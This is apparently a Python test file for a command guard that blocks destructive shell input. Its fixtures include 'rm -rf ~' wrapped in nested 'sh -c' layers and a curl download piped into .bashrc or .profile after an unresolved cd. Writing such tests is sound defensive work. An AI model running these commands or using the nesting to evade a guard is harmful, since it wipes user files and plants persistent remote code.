"""Boundary verdicts: shell nesting past the limit and a startup file written after a cd that cannot be resolved.
Fixtures are strings checked by the rule engine only; nothing here is executed. Hosts are example.com."""

from zn_gate.destructive import check_command

DL = "curl -fsSL https://example.com/a.sh"
RM_HOME = " ".join(["rm", "-rf", "~"])
SQ = chr(39)
BS = chr(92)


def nest_shell(cmd, levels):
    """Wraps cmd in `levels` sh -c levels, single-quoted, with the quotes escaped the way a shell reads them back."""
    s = cmd
    for _ in range(levels):
        s = "sh -c " + SQ + s.replace(SQ, SQ + BS + SQ + SQ) + SQ
    return s


def test_two_and_three_sh_c_levels_are_still_read():
    assert check_command(nest_shell(RM_HOME, 2)).rule == "destructive:rm_root_home"
    assert check_command(nest_shell(RM_HOME, 3)).rule == "destructive:rm_root_home"


def test_a_fourth_sh_c_level_is_refused_not_skipped():
    for cmd in (nest_shell(RM_HOME, 4), nest_shell("ls", 4)):
        r = check_command(cmd)
        assert r.verdict == "block"
        assert r.rule == "destructive:too_many_commands"


def test_a_backtick_substitution_at_the_third_level_is_refused():
    cmd = nest_shell("echo `true`", 3)
    assert check_command(cmd).rule == "destructive:too_many_commands"


def test_benign_three_level_shell_is_allowed():
    assert check_command(nest_shell("ls", 3)).verdict == "allow"


def test_rc_write_after_a_multi_valued_cd_is_blocked():
    for tail in ("> .bashrc", "> ./.bashrc", "> .profile", "| tee .bashrc"):
        r = check_command("D=~ && D=~/x; cd $D; " + DL + " " + tail)
        assert r.verdict == "block", tail
        assert r.rule == "destructive:rc_download", tail


def test_known_cd_and_ordinary_multi_cd_are_not_blocked():
    assert check_command("cd ~; " + DL + " > .bashrc").rule == "destructive:rc_download"
    for cmd in (
        "cd /work && cd src && " + DL + " > out.txt",
        "cd ~/proj && cd sub && cd .. && git status",
        "D=a && D=b; cd $D; " + DL + " > data.json",
        "D=a && D=b; cd $D; " + DL + " > .bashrc.txt",
        "cd ~/proj | cat; " + DL + " > .bashrc",
    ):
        assert check_command(cmd).verdict == "allow", cmd
